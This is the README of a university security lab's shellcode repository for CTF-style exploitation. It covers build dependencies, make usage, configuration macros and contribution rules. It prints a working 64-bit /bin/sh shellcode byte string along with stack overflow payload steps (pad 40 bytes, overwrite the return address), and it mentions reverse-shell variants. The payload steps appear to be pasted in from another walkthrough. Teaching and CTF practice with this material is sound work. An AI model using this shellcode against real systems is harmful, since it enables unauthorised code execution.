#Shellcode
This is a repository of Shellcode written by students in NYU-Polytechnic's [ISIS](http://www.isis.poly.edu/) lab. This repository came about as a need for trustworthy and reliable 32/64 bit Intel shellcode for CTF style exploitation.


This repository also contains the [`isis`](https://github.com/isislab/Shellcode/tree/master/isis) python library that has a handful of useful functions for exploitation. 





##Dependencies
In order to assemble and link(for testing) you will need to install:

- GCC
- GCC-multilib
- Nasm
- ia32-libs


To install:

`sudo apt-get install gcc gcc-multilib nasm ia32-libs`



##Usage
Each folder containing shellcode has at least two files. A .s file containg the assembly and a makefile. Typing make in a folder will assemble the shellcode as a raw binary file called `shellcode` and generate an ELF binary for testing called `testShellcode`. Shellcode that cannot be tested by running `testShellcode` alone will have other instructions. You can also test the shellcode by incorporating it into a working exploit. If you would like to hardcode the shellcode into your exploit instead of reading it from the shellcode file you can use the [shellcode as array python script.](https://github.com/isislab/Shellcode/blob/master/shellcodeAsArray/sa.py)


Run ‘make’ to compile the shellcode
Leverage the ‘shellcodeAsArray’ Python script to convert the shellcode to a hex array for use within a Python script
Place the hex array at the beginning of our payload
Pad the unused bytes with whatever we’d like (confirm the total bytes before the return address is 40)
Replace the 8 “B”s with the value of the “Location” address
# git clone https://github.com/isislab/Shellcode.git
Cloning into 'Shellcode'...
remote: Counting objects: 925, done.
remote: Total 925 (delta 0), reused 0 (delta 0), pack-reused 925
Receiving objects: 100% (925/925), 9.22 MiB | 12.31 MiB/s, done.
Resolving deltas: 100% (406/406), done.
# cd Shellcode/64BitLocalBinSh/
# make
nasm -f elf64 shell64.s -I ../include/ -I ../include/runtime/ -o linkme.o
nasm shell64.s -I ../include/ -I ../include/runtime/ -o shellcode
gcc linkme.o -o testShellcode 
# python ../shellcodeAsArray/sa.py shellcode 
shellcode = ( "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0"
"\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
)




####Configuring
The behaviour of most shellcode instances can be configured with `%define`s. Here are some examples:

- Change the systemcall mechanism. [Mechanism Choice.](https://github.com/isislab/Shellcode/blob/master/32shellEmulator/makefile#L6)  [SYSTEM_CALL macro definition.](https://github.com/isislab/Shellcode/blob/master/include/syscall.s)
- Change the shell mechanism after socket or other operations. [Modular shellcode.](https://github.com/isislab/Shellcode/blob/master/32bitSocketReuse/shell32.s#L63) 
- Enable/disable debugging or other functionality. [Debug.](https://github.com/isislab/Shellcode/blob/master/32bitSocketReuse/shell32.s#L35) [Playfair](https://github.com/isislab/Shellcode/blob/master/32shellEmulator/shell32.s#L22)
- Configure IP/Port for connect back shelcode. [IP/htons macro.](https://github.com/isislab/Shellcode/blob/master/reverse32IPv4/r32.s#L10)

##Writing one-off/special purpose shellcode 
There are many macros in the [include](https://github.com/isislab/Shellcode/tree/master/include) folder that make writing new shellcode easier or modifying shellcode for different operating systems possible. 

##Contributing
Please feel free to contribute by submitting feature requests and bug reports to the issue tracker. Commit bits(for ISIS students only) and pull requests will be handled on a case by case basis.

